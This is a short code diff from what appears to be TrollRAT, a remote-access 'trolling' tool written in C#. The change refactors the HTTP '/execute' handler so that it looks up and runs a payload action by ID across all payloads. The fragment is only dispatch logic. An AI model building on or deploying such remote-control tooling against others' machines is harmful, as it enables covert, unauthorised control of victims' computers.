@@ -125,25 +125,27 @@ namespace TrollRAT
                     }
                     else if (context.Request.Url.AbsolutePath == "/execute")
                     {
-                        int pl = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("payload"));
-                        Payload payload = payloads[pl];
-
                         int id = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("id"));
-                        foreach (PayloadAction action in payload.Actions)
+
+                        foreach (Payload payload in payloads)
                         {
-                            if (action.ID == id)
+                            foreach (PayloadAction action in payload.Actions)
                             {
-                                string response = action.execute(payload);
+                                if (action.ID == id)
+                                {
+                                    string response = action.execute(payload);
 
-                                byte[] data = Encoding.UTF8.GetBytes(response.ToString());
+                                    byte[] data = Encoding.UTF8.GetBytes(response.ToString());
 
-                                context.Response.ContentLength64 = data.Length;
-                                context.Response.StatusCode = 200;
-                                context.Response.ContentType = "text/javascript";
+                                    context.Response.ContentLength64 = data.Length;
+                                    context.Response.StatusCode = 200;
+                                    context.Response.ContentType = "text/javascript";
 
-                                context.Response.OutputStream.Write(data, 0, data.Length);
+                                    context.Response.OutputStream.Write(data, 0, data.Length);
+                                }
                             }
                         }
+                        
                     }
                     else if (context.Request.Url.AbsolutePath == "/settings")
                     {
